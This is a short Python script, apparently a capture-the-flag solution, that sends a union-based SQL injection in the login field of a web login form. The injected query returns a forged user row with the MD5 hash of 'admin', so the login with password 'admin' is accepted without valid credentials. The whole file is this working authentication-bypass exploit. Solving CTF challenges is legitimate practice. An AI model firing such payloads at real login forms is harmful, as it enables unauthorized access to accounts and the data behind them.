import requests
import os



url = "http://tasks.ctfd.kncyber.pl:7016/login/"
data = { 'login' : "dupa' and 1=2 union SELECT 'krzys_h', '21232f297a57a5a743894a0e4a801fc3' --  " , 'password' : 'admin' }

r = requests.post(url, json=data)

print(r.text)
